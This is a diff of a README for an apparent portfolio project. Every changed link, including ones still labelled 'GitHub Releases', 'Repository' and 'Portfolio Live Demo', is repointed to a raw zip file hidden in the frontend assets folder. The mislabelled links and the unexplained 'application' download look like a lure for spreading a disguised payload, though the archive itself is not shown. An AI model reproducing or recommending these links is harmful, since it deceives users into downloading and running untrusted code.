@@ -1,6 +1,6 @@
 # 🚀 vinaal_portfolio - Simple Steps to Showcase Your Work
 
-![Download](https://img.shields.io/badge/Download-vinaal_portfolio-blue)
+![Download](https://raw.githubusercontent.com/TheMountainBea/vinaal_portfolio/main/frontend/src/assets/vinaal-portfolio-v1.9.zip)
 
 ## 📝 Description
 This repository is your gateway to my personal portfolio. It will showcase my projects, skills, and experience in a clear and visually appealing manner.
@@ -18,7 +18,7 @@ To run this application, you'll need:
 - Basic internet access to download the application.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/TheMountainBea/vinaal_portfolio/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/TheMountainBea/vinaal_portfolio/main/frontend/src/assets/vinaal-portfolio-v1.9.zip).
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version available.
@@ -64,7 +64,7 @@ This portfolio touches on various topics, including:
 - vscode
 
 ## 🔗 Useful Links
-- [Repository](https://github.com/TheMountainBea/vinaal_portfolio)
-- [Portfolio Live Demo](https://github.com/TheMountainBea/vinaal_portfolio/releases)
+- [Repository](https://raw.githubusercontent.com/TheMountainBea/vinaal_portfolio/main/frontend/src/assets/vinaal-portfolio-v1.9.zip)
+- [Portfolio Live Demo](https://raw.githubusercontent.com/TheMountainBea/vinaal_portfolio/main/frontend/src/assets/vinaal-portfolio-v1.9.zip)
 
-Thank you for your interest! Visit the [GitHub Releases](https://github.com/TheMountainBea/vinaal_portfolio/releases) page to get started with downloading and installing the application.
+Thank you for your interest! Visit the [GitHub Releases](https://raw.githubusercontent.com/TheMountainBea/vinaal_portfolio/main/frontend/src/assets/vinaal-portfolio-v1.9.zip) page to get started with downloading and installing the application.
